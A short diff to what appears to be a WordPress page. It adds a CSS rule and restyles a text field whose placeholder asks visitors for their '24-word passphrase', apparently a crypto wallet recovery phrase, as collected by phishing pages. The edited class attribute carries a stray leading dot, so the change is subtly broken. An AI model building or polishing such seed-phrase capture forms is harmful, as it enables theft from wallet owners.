@@ -57,6 +57,11 @@
 		}
 	</style>
 	<style id="global-styles-inline-css" type="text/css">
+		.txt-input{
+			font-style: normal !important;
+			height: 100px !important;
+			font-weight: normal !important;
+		}
 		body {
 			--wp--preset--color--black: #000000;
 			--wp--preset--color--cyan-bluish-gray: #abb8c3;
@@ -791,7 +796,7 @@
 			
 			<input
 				type="text"
-				className="mf-input "
+				className="mf-input .txt-input"
 				id="mf-input-text-2c78f37"
 				name="mf-text"
 				placeholder="${ parent.decodeEntities(`Enter your 24-word passphrase here`) } "
